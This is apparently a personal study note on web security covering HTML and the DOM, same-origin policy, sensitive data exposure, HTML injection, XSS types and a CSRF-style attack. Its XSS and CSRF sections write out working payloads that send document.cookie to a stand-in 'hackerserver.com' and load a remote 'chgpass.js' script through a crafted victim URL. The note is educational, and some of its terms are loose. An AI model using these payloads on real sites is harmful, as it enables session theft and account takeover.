# Website.

- a website consist of mainly two parts
  - a backend server
  - a front-end client.
- front-end client usually is the web browser rendering webpage.
- webpages are mostly written in these tree language.

  - html
  - css
  - javascript.

- html is the skeleton of a website, html syntax consist of tag enclosing a text.

  - example of html tag is the h1 `<h1>Hello World</h1>` tag.
  - you can learn more [here](https://www.w3schools.com/html/).
  - webpage are build up of these tags, different tags yield different view.
  - an example is the input tags which rendered as a form and enable user to write something to it.
  - each of these html tags element are called `DOM (Document Object Model) element`.
  - `DOM` are seperate into 3 parts.
    - Core DOM (main DOM).
    - XML DOM ( another markup language like HTML ).
    - HTML DOM.
  - main structure of html consist of these main tags.

    ```html
    <html>
      <head>
        <meta />
        <link />
        <style></style>
        <script></script>
      </head>

      <body></body>

      <footer></footer>
    </html>
    ```

  - it consist of the main root document which is the `<html>` tags.
  - then inside it are the `head`,`body` and `footer`.
  - these elements are in the `HTML DOM`.
  - we can refer the `head` tags as `document.head` because head is part of `document` object.
  - inside `head` tags usually but not always contains stuff that are not rendered directly into the webpage.
    - these stuff such as metadata for SEO purpose.
    - `link` to refer external resources to the webpage.
    - `script` tag that are use to write javascript to the webpage.
    - `style` tag that are use to write css.

- we can view these HTMLs text in the browser by `right clicking` on a webpage and select `view page source` or typing `ctrl + u` .
- these source code are publicly available and was sent by back end server to the front-end client (browser) to render.

## Same Origin Policy

- same origin policy prevent, other website, or out website to load document or script from another origin.
- it help isolate malicious document on other host/origin, from running JS file in our website.

### origin

- two or many URLs have the same origin if this criterias are present:

  - same protocol
  - same host.
  - same port

- examlpe a website `http://forum.dragonforce.my/`
- a url considered as same origin are
  - `http://forum.dragonforce.my/index.html`
  - `http://forum.dragonforce.my/anything.html`
  - `http://forum.dragonforce.my/archive/index.php`
  - the different between these urls and the main url is just the path different.
  - the protocol, host and port are the same.
- example of not same origin are
  - `ftp://forum.dragonforce.my/dir/`
  - `https://forum.dragonfoce.my/index.html`
  - `http://forum.dragonfoce.my:4444/index.html`
  - `https://news.dragonfoce.my/index.html`
  - these example are wrong because of the different in protocols, port and hostname

## IMPORTAN SECURITY NOTE.

- for a web developer, it is important to make sure that there is no sensitive information in front-end code because those information are publicly available to the client to view.
- we should never perform password checking or storing API keys of other services in a client side code.
- it is unwise to direcly connect to a database from a front-end code, because database credentials used to connect to it can easily be seen by the client.
- a vulnerability in front end usually does't directly effecting the back end server permanently as it just happen in the client browser and get reset whenever client re-render the webpage.
- but it can sometimes cause problem to the end user that are using the website example like XSS attack or page defacement.

## Leaks sensitve information.

- also known as `Sensitive Data Exposure`.
- happen when developer put sensitive information such as login credentials or API token in front-end code.
- other sensitive information such as

  - URL to webserver directories.
    - tho information such as directories structure can be bruteforce using tools.
  - infrastructure information, or webserver information such as software versions.
  - front-end framework information such as their version.

    - these information might not sound sensitve but an attacker can investigate specific version for vulnerabilities and narrow down their attack method.
    - quick tips is try to search for comments, as developer usually love to comments in their code.

  - source files.
    - sometimes we can find other source

## Injection Attack.

- code injection happen when user input are not properly validate or sanitized.
- this can happen due to lack of input validation or sanitization on either front end or back end or both.

### In case of HTML injection.

- attacker inject a html code, that will be stored in database
- these HTML are then get reflected back to other front-end users.
- the example is like not sanitized and escape html character in a form to write a comments in a forum.
  - an attacker can inject their own HTMLs to perform defacement on the webpage.
  - they can also use this to createe phising such as login form that will submit to an attacker server.
  - attacker can also inject ads to generate money.

### XSS (Cross-site Scripting)

- this attack is leveraging the vulnerabilities of html injection.
- when our code doesn't sanitise or validate user input, an attacker can inject JavaScript code into the database.
- the stored code, latter when fetched by other user, will get rendered to their webpage.
- an attacker can craft javascript payload to steal and transport data such as user cookies, token, ip address etc..
- there are 3 main type of XSS attack:

  - Reflected XSS
    - happen when, attacker inject a payload, and the payload immediatly reflected/ get shown back to the attacker.
    - example is when attacker inject code into vuln search form.
    - website usually reflect back user input to let they know of the search result.
    - as example a attacker inject `<b>hello</b> ` using `<b>` tag to make text bold, into the search form.
    - the webpage respond with "Your search result for: **hello**", in this case the word hello are shown in bold. indicating that the webpage doesn't sanitize the html tag properly and the input get reflected as the attacker sent.
    - some webpage simply get over this by output it back as a string `"<b>hello</b>"`, so it not get rendered as html element.
  - Stored XSS

    - the different between this XSS and reflected is that, the user input here are stored in database, and then get reflected back to user.
    - maybe the dev doesn't sanitize the input before store it in database.
    - this happen when attacker injecting a form, or API that will get save data in database.

  - DOM XSS

    - DOM XSS is like reflected XSS, there there is a client-side javascript, that take unfiltered user input, and add it to the DOM.

    ```js
    const searchForm = document.getElementById("search");
    const searchResultText = document.getElementById("resultText");

    searchResultText.innerHTML = "You Search Result for:" + searchForm.value;
    ```

    - when rendered will show something like

    <h2>You Search Result for: <b>hello</b> </h2>
    - if we inject a javascript to create alert or get `document.cookie`
    - the webpage will render it as a new DOM element and execute the code.
    - with the same code as above, let say attacker try this as input

    ```html
    <script>
      alert(1);
    </script>
    ```

    - this might not show anything,
    - HTML5 does not allow script tags to be dynamically added using the innerHTML property.
    - attacker can make use of other ways to invoke javaScript such as

    ```html
    <img src=/ onerror=alert(1)>
    ```

    - this might work and we can see an alert box.
    - we can then try to get cookie using the same ways.

    ```html
    <img src=/ onerror=alert(document.cookie)>
    ```

    - we can sent the cookie to our own server listening for a get request with the cookies as query.
    - example our attacker server `http://hackerserver.com/?cookie=`;
    - in the XSS payload we can send it using

    ```html
    <img src= /
    onerror="this.src='http://hackerserver.com/?cookie='+document.cookie;
    this.removeAttribute('onerror');">
    ```

### Cross-site Request Forgery (CSRF).

- [usefull resource](https://labs.f-secure.com/blog/getting-real-with-xss/)
- this attack is the next step for XSS attack, it leverage the XSS vulnerabilities to send request or API call to back-end server using the victim sessions/token
- this give the attacker full control of their victim account.
- they can craft payload, to change the victim password, whenever the victim load xss in their webpage, the victim will unknowingly get their password changed.
- an attacker can host malicious script on their server named `chgpass.js` and then add the link to the XSS payload and inject it to the vulnerable site.
- they can use the payload either thru malicious URL or stored XSS.
- let say malicious URL.
  - the website `http://victim.com/`, have a DOM XSS vulnerabilities when user send a query like this.
  ```
  http://victim.com/search.php?term=<img src=/ onerror=alert(1)>
  ```
  - using previous payload we might send the link to other user, maybe via phising email or chat.
  - we can use this payload to append a new script tag to the DOM.
  ```html
  <img src=/ onerror="var x=document.createElement('script');
  x.src='http://hackerserver.com/chgpass.js';
  document.getElementsByTagName('head')[0].appendChild(x);"/>
  ```
  - the URL will look something like this.
  ```
  http://victim.com/search.php?term=<img src=/ onerror="var x=document.createElement('script');
  x.src='http://hackerserver.com/chgpass.js';
  document.getElementsByTagName('head')[0].appendChild(x);"/>
  ```
  - a user or admin that are logged in to `http://victim.com` might see that the url is from the same domain, then if they clicked on the link, it will then execute the script in the background.
